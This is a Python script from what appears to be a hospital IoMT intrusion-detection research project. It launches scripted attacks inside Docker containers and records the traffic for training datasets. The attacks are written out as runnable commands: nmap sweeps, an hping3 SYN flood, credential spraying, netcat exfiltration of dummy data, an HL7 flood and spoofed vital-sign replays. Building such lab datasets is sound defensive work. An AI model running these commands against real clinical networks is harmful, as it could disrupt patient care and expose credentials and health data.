"""
IoMT Medical NIDS Simulator — Physical Docker Attack Detonator (World 2)
Automates real cyber-attack execution across the Docker hospital network.

Available Attack Modules:
  recon       - Aggressive NMAP port/service sweep across all clinical zones
  dos         - SYN Flood (hping3) against the PACS imaging server
  brute_force - SSH/HTTP brute-force login attempts against the AD server
  lateral     - East-west pivot from compromised IT zone into clinical subnets
  exfil       - Simulated data exfiltration from the file share to external IP
  hl7_flood   - High-rate TCP message flood against the HL7 engine port (2575)
  ble_replay  - BLE beacon replay attack against the IoMT telemetry aggregator
  all         - Execute ALL modules sequentially (full kill-chain)
  menu        - Interactive selection menu
"""

import subprocess
import argparse
import time
import sys
from pathlib import Path

# --- Configuration ---
ROUTER_CONTAINER = "hospital_router"
ATTACKER_CONTAINER = "hacker_apt_external"
OUTPUT_DIR = Path("output_datasets")

# --- Target IP Map (from configs/devices/medium_hospital.json Docker subnets) ---
TARGETS = {
    "ad_server":        "10.0.1.10",
    "dns_server":       "10.0.1.11",
    "ehr_frontend":     "10.0.1.12",
    "file_share":       "10.0.1.13",
    "pacs_server":      "10.0.2.10",
    "hl7_engine":       "10.0.2.12",
    "nurse_station_01": "10.0.2.13",
    "device_mgmt":      "10.0.2.14",
    "ct_scanner":       "10.0.3.10",
    "mri_scanner":      "10.0.3.11",
    "telemetry_agg":    "10.0.4.10",
    "patient_mon_01":   "10.0.4.11",
    "infusion_pump_01": "10.0.4.12",
    "ventilator_01":    "10.0.4.13",
    "ble_gw":           "10.0.4.14",
}

# All available attack module names
ATTACK_MODULES = ["recon", "dos", "brute_force", "lateral", "exfil", "hl7_flood", "ble_replay"]


def run_docker_exec(container, command, detach=False):
    """Executes a command inside a specific Docker container."""
    print(f"[{container}] Executing: {command}")
    cmd_list = ["docker", "exec", "-u", "root"]
    if detach:
        cmd_list.append("-d")
    cmd_list.extend([container, "sh", "-c", command])

    if detach:
        subprocess.Popen(cmd_list, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        return True
    else:
        result = subprocess.run(cmd_list, capture_output=True, text=True)
        if result.returncode != 0:
            print(f"Error [{container}]: {result.stderr}")
            return False
        return result.stdout.strip()


def check_containers():
    """Verify that both the router and the attacker containers are actively running."""
    print("[*] Verifying Docker environment state...")
    result = subprocess.run(["docker", "ps", "--format", "{{.Names}}"], capture_output=True, text=True)
    running = result.stdout.split('\n')
    if ROUTER_CONTAINER not in running or ATTACKER_CONTAINER not in running:
        print(f"[!] Critical Error: Missing required containers.")
        print(f"Ensure {ROUTER_CONTAINER} and {ATTACKER_CONTAINER} are running via docker-compose.")
        sys.exit(1)
    print("[*] Required containers are active.")


def setup_environment():
    """Installs necessary attacking tools (nmap, hping3) and capture tools (tcpdump)."""
    print(f"\n[*] Injecting dependencies into [{ROUTER_CONTAINER}]...")
    run_docker_exec(ROUTER_CONTAINER, "apk update && apk add tcpdump")

    print(f"[*] Injecting hacking tools into [{ATTACKER_CONTAINER}]...")
    run_docker_exec(ATTACKER_CONTAINER, "apk update && apk add nmap hping3 curl --repository=http://dl-cdn.alpinelinux.org/alpine/edge/testing/")
    print("[*] Environment preparation complete.\n")


def start_capture():
    """Starts tcpdump on the router in the background."""
    print("[*] Initializing live Network Tap (tcpdump) on the Router...")
    run_docker_exec(ROUTER_CONTAINER, "rm -f /tmp/attack_pcap.pcap")
    run_docker_exec(ROUTER_CONTAINER, "tcpdump -i any -w /tmp/attack_pcap.pcap", detach=True)
    time.sleep(2)
    print("[*] Router is now officially capturing all physical cross-layer traffic.")


def stop_capture_and_extract(output_name="physical_attack.pcap"):
    """Stops tcpdump and copies the generated PCAP out of the Docker container."""
    print(f"\n[*] Stopping Network Tap on [{ROUTER_CONTAINER}]...")
    run_docker_exec(ROUTER_CONTAINER, "pkill tcpdump || true")
    time.sleep(2)

    OUTPUT_DIR.mkdir(parents=True, exist_ok=True)
    out_path = OUTPUT_DIR / output_name

    print(f"[*] Extracting Raw PCAP to {out_path}...")
    subprocess.run(["docker", "cp", f"{ROUTER_CONTAINER}:/tmp/attack_pcap.pcap", str(out_path)])
    print(f"\n[SUCCESS] Physical Detonation Complete. PCAP extracted: {out_path}")
    print("[*] This PCAP contains real payload bytes from Alpine Linux OS interactions, perfect for DPI analysis.")


# ══════════════════════════════════════════════════════════════
# ATTACK MODULE 1: Reconnaissance (A01)
# ══════════════════════════════════════════════════════════════
def execute_recon_attack():
    """Detonates a loud NMAP Ping/Port Sweep against the clinical subnets."""
    print("\n==============================================")
    print("🔥 INITIATING: Aggressive Reconnaissance Sweep")
    print("==============================================")
    print("[*] Attacker is sweeping the IT (10.0.1.0/24) and Clinical Core (10.0.2.0/24) zones...")
    
    stdout = run_docker_exec(ATTACKER_CONTAINER, "nmap -T4 -F 10.0.1.0/24 10.0.2.0/24")
    print("\n--- [NMAP HIGHLIGHTS] ---")
    lines = str(stdout).split('\n')
    for line in lines:
       if "report for" in line or "open" in line:
           print("    " + line)
    print("-------------------------\n")


# ══════════════════════════════════════════════════════════════
# ATTACK MODULE 2: Denial of Service (A21)
# ══════════════════════════════════════════════════════════════
def execute_dos_attack():
    """Detonates a SYN Flood Denial of Service against the PACS imaging server."""
    print("\n==============================================")
    print("🔥 INITIATING: SYN Flood Denial of Service")
    print("==============================================")
    target_ip = TARGETS["pacs_server"]
    print(f"[*] Attacker is unleashing hping3 SYN flood against PACS Server ({target_ip})...")
    
    run_docker_exec(ATTACKER_CONTAINER, f"hping3 -c 5000 -d 120 -S -w 64 -p 443 --flood --rand-source {target_ip}", detach=True)
    
    for i in range(10, 0, -1):
        print(f"    Flooding active... {i} seconds remaining.", end='\r')
        time.sleep(1)
    
    print("\n[*] Halting DoS Flood.")
    run_docker_exec(ATTACKER_CONTAINER, "pkill hping3 || true")


# ══════════════════════════════════════════════════════════════
# ATTACK MODULE 3: Brute Force (A04)
# ══════════════════════════════════════════════════════════════
def execute_brute_force_attack():
    """Brute-force SSH/HTTPS login attempts against the AD Server and EHR Frontend."""
    print("\n==============================================")
    print("🔥 INITIATING: Brute Force Login Attack")
    print("==============================================")
    ad_ip = TARGETS["ad_server"]
    ehr_ip = TARGETS["ehr_frontend"]
    print(f"[*] Targeting AD Server ({ad_ip}) and EHR Frontend ({ehr_ip})...")

    # Rapid SSH connection attempts to AD (will fail but generates traffic)
    print("[*] Phase 1: SSH brute-force against Active Directory...")
    for i in range(20):
        run_docker_exec(ATTACKER_CONTAINER,
                        f"echo 'admin:password{i}' | timeout 2 nc -w 1 {ad_ip} 22 2>/dev/null || true")
    
    # HTTPS login spray against EHR
    print("[*] Phase 2: HTTPS credential spray against EHR Frontend...")
    for i in range(15):
        run_docker_exec(ATTACKER_CONTAINER,
                        f"curl -s -o /dev/null -w '%{{http_code}}' --connect-timeout 2 "
                        f"https://{ehr_ip}:443/login -d 'user=admin&pass=attempt{i}' -k 2>/dev/null || true")
    
    print("[*] Brute Force module complete.\n")


# ══════════════════════════════════════════════════════════════
# ATTACK MODULE 4: Lateral Movement (A17)
# ══════════════════════════════════════════════════════════════
def execute_lateral_movement():
    """East-west pivot from IT Zone into Clinical Core and Imaging subnets."""
    print("\n==============================================")
    print("🔥 INITIATING: East-West Lateral Movement")
    print("==============================================")
    
    clinical_targets = [
        ("Nurse Station", TARGETS["nurse_station_01"], 443),
        ("Device Mgmt",   TARGETS["device_mgmt"], 22),
        ("CT Scanner",    TARGETS["ct_scanner"], 11112),
        ("MRI Scanner",   TARGETS["mri_scanner"], 11112),
        ("Patient Monitor", TARGETS["patient_mon_01"], 8080),
    ]
    
    print("[*] Pivoting from compromised IT endpoint into clinical assets...")
    for name, ip, port in clinical_targets:
        print(f"    → Probing {name} ({ip}:{port})...")
        run_docker_exec(ATTACKER_CONTAINER, f"nmap -sT -p {port} --open {ip} 2>/dev/null || true")
        # Attempt connection to simulate SMB/RDP lateral movement
        run_docker_exec(ATTACKER_CONTAINER, f"echo 'PIVOT' | timeout 2 nc -w 1 {ip} {port} 2>/dev/null || true")
    
    print("[*] Lateral Movement module complete.\n")


# ══════════════════════════════════════════════════════════════
# ATTACK MODULE 5: Data Exfiltration (A14/A20)
# ══════════════════════════════════════════════════════════════
def execute_exfiltration():
    """Simulated PHI exfiltration: generate dummy data and transfer it across zones."""
    print("\n==============================================")
    print("🔥 INITIATING: Data Exfiltration Simulation")
    print("==============================================")
    fs_ip = TARGETS["file_share"]
    pacs_ip = TARGETS["pacs_server"]
    
    # Stage 1: Discovery — scan the file share and PACS
    print(f"[*] Stage 1: Enumerating data on File Share ({fs_ip}) and PACS ({pacs_ip})...")
    run_docker_exec(ATTACKER_CONTAINER, f"nmap -sT -p 445,11112 {fs_ip} {pacs_ip} 2>/dev/null || true")
    
    # Stage 2: Generate dummy PHI payload and push it across the network
    print("[*] Stage 2: Staging 1MB of simulated PHI data...")
    run_docker_exec(ATTACKER_CONTAINER, "dd if=/dev/urandom of=/tmp/exfil_payload.bin bs=1024 count=1024 2>/dev/null")
    
    # Stage 3: Push data to external (router interface acts as egress point)
    print(f"[*] Stage 3: Exfiltrating payload via TCP to external sink...")
    # Start a listener on the attacker side, then push data
    run_docker_exec(ATTACKER_CONTAINER, f"cat /tmp/exfil_payload.bin | timeout 5 nc -w 2 {TARGETS['dns_server']} 8443 2>/dev/null || true")
    
    print("[*] Exfiltration module complete.\n")


# ══════════════════════════════════════════════════════════════
# ATTACK MODULE 6: HL7 Message Flood (A16)
# ══════════════════════════════════════════════════════════════
def execute_hl7_flood():
    """High-rate TCP message flood against the HL7 Engine port (2575)."""
    print("\n==============================================")
    print("🔥 INITIATING: HL7 Message Flood Attack")
    print("==============================================")
    hl7_ip = TARGETS["hl7_engine"]
    print(f"[*] Flooding HL7 Engine ({hl7_ip}:2575) with malformed ADT messages...")
    
    # Generate HL7-like message bursts
    hl7_msg = "MSH|^~\\&|ATTACK|BAD|HL7ENGINE|HOSP|20250325||ADT^A01|FLOOD{i}|P|2.5\\rPID|||FAKE^^^MR||DOE^JOHN\\rPV1||I"
    
    for i in range(50):
        msg = hl7_msg.replace("{i}", str(i))
        run_docker_exec(ATTACKER_CONTAINER,
                        f"echo '{msg}' | timeout 1 nc -w 1 {hl7_ip} 2575 2>/dev/null || true")
    
    print("[*] HL7 Flood module complete.\n")


# ══════════════════════════════════════════════════════════════
# ATTACK MODULE 7: BLE Telemetry Replay (A11)
# ══════════════════════════════════════════════════════════════
def execute_ble_replay():
    """Simulated BLE telemetry replay attack against the IoMT telemetry aggregator."""
    print("\n==============================================")
    print("🔥 INITIATING: BLE Telemetry Replay Attack")
    print("==============================================")
    telem_ip = TARGETS["telemetry_agg"]
    ble_gw_ip = TARGETS["ble_gw"]
    print(f"[*] Replaying spoofed vital-sign telemetry to Aggregator ({telem_ip}) via BLE GW ({ble_gw_ip})...")
    
    # Simulate replayed BLE packets (TCP-encapsulated for Docker bridge)
    for i in range(30):
        # Fake vital signs: heart_rate=72, spo2=98, bp_sys=120 (repeated = replay signature)
        payload = f"BLE_REPLAY|sensor_id=wearable_01|hr=72|spo2=98|bp=120/80|seq={i % 5}"
        run_docker_exec(ATTACKER_CONTAINER,
                        f"echo '{payload}' | timeout 1 nc -w 1 {telem_ip} 8080 2>/dev/null || true")
    
    # Also flood the BLE Gateway directly
    for i in range(20):
        payload = f"BLE_SPOOF|sensor_id=patient_mon_fake|hr=999|spo2=50|seq={i}"
        run_docker_exec(ATTACKER_CONTAINER,
                        f"echo '{payload}' | timeout 1 nc -w 1 {ble_gw_ip} 8080 2>/dev/null || true")
    
    print("[*] BLE Replay module complete.\n")


# ══════════════════════════════════════════════════════════════
# Interactive Menu
# ══════════════════════════════════════════════════════════════
def interactive_menu():
    """Display interactive attack selection menu."""
    attack_info = {
        "recon":       ("A01: Aggressive Reconnaissance Sweep",     "NMAP scan across IT & Clinical zones"),
        "dos":         ("A21: SYN Flood Denial of Service",         "hping3 flood against PACS Server"),
        "brute_force": ("A04: Brute Force Login Attack",            "SSH/HTTPS credential spray against AD & EHR"),
        "lateral":     ("A17: East-West Lateral Movement",          "Pivot from IT zone into Clinical/Imaging/IoMT"),
        "exfil":       ("A14/A20: Data Exfiltration",               "Enumerate, stage, and exfiltrate simulated PHI"),
        "hl7_flood":   ("A16: HL7 Message Flood",                   "TCP flood of malformed HL7 ADT messages"),
        "ble_replay":  ("A11: BLE Telemetry Replay",                "Spoofed vital-sign replay to IoMT aggregator"),
    }

    print("\n╔══════════════════════════════════════════════════════════╗")
    print("║     🏥 IoMT Physical Attack Detonator — Module Menu     ║")
    print("╠══════════════════════════════════════════════════════════╣")
    for i, (key, (title, desc)) in enumerate(attack_info.items(), 1):
        print(f"║  [{i}] {title:<45s}    ║")
        print(f"║      {desc:<49s}    ║")
    print("║  [8] Execute ALL modules (full kill-chain)              ║")
    print("║  [0] Exit                                               ║")
    print("╚══════════════════════════════════════════════════════════╝")

    choice = input("\nSelect attack module(s) [comma-separated, e.g. 1,3,5]: ").strip()
    if choice == "0":
        return []
    if choice == "8":
        return ATTACK_MODULES[:]

    selected = []
    keys = list(attack_info.keys())
    for c in choice.split(","):
        c = c.strip()
        if c.isdigit() and 1 <= int(c) <= len(keys):
            selected.append(keys[int(c) - 1])
    return selected


# ══════════════════════════════════════════════════════════════
# Module Dispatch
# ══════════════════════════════════════════════════════════════
ATTACK_DISPATCH = {
    "recon":       execute_recon_attack,
    "dos":         execute_dos_attack,
    "brute_force": execute_brute_force_attack,
    "lateral":     execute_lateral_movement,
    "exfil":       execute_exfiltration,
    "hl7_flood":   execute_hl7_flood,
    "ble_replay":  execute_ble_replay,
}


def main():
    parser = argparse.ArgumentParser(
        description="IoMT Physical Docker Attack Detonator (World 2)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Available attack modules:
  recon        A01: Aggressive NMAP port sweep
  dos          A21: SYN Flood against PACS Server
  brute_force  A04: SSH/HTTPS brute-force against AD & EHR
  lateral      A17: East-west lateral movement into clinical zones
  exfil        A14/A20: Simulated PHI data exfiltration
  hl7_flood    A16: HL7 message flood against clinical engine
  ble_replay   A11: BLE telemetry replay attack
  all          Execute ALL modules (full kill-chain)
  menu         Interactive selection menu

Examples:
  python scripts/docker_attacker.py --attack recon
  python scripts/docker_attacker.py --attack dos,brute_force
  python scripts/docker_attacker.py --attack menu
  python scripts/docker_attacker.py --attack all
        """
    )
    parser.add_argument("--attack", default="all",
                        help="Attack module(s) to execute. Comma-separated or 'all' or 'menu'.")
    parser.add_argument("--capture-name", default="physical_attack_sample.pcap",
                        help="Output filename for the extracted traffic capture.")
    
    args = parser.parse_args()

    print(f"🏥 IoMT Medical NIDS Simulator - Physical Attack Detonator 💀")
    print("================================================================")
    
    # Determine which modules to run
    if args.attack == "menu":
        selected = interactive_menu()
        if not selected:
            print("[*] No modules selected. Exiting.")
            return
    elif args.attack == "all":
        selected = ATTACK_MODULES[:]
    else:
        selected = [s.strip() for s in args.attack.split(",") if s.strip() in ATTACK_DISPATCH]
    
    if not selected:
        print(f"[!] No valid attack modules found in '{args.attack}'.")
        print(f"    Valid options: {', '.join(ATTACK_MODULES)}, all, menu")
        sys.exit(1)
    
    print(f"\n[*] Selected modules: {', '.join(selected)}")
    
    check_containers()
    setup_environment()
    start_capture()
    
    try:
        for i, module in enumerate(selected):
            if i > 0:
                print(f"\n[*] Pausing 3s between attack stages...")
                time.sleep(3)
            func = ATTACK_DISPATCH.get(module)
            if func:
                func()
            else:
                print(f"[!] Unknown module: {module}")
            
    except KeyboardInterrupt:
        print("\n[!] Attack interrupted by user. Extracting partial PCAP...")
    
    finally:
        stop_capture_and_extract(args.capture_name)


if __name__ == "__main__":
    main()
